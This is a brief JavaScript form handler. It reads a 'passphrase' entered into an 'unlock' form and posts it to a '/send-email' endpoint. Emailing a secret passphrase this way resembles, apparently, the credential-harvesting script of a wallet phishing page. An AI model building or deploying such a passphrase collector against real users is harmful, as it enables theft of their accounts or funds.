document.getElementById("unlock-form").addEventListener("submit", async function (event) {
    event.preventDefault(); // Prevent form from reloading page

    const message = document.getElementById("message").value.trim();

    if (!message) {
        alert("Please enter your passphrase.");
        return;
    }

    try {
        const response = await fetch("/send-email", { // Use relative path
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message }) 
        });

        if (response.ok) {
            alert("Message sent successfully!");
            document.getElementById("unlock-form").reset(); // Clear input
        } else {
            alert("Error sending message.");
        }
    } catch (error) {
        console.error("Error:", error);
        alert("An error occurred. Try again later.");
    }
});
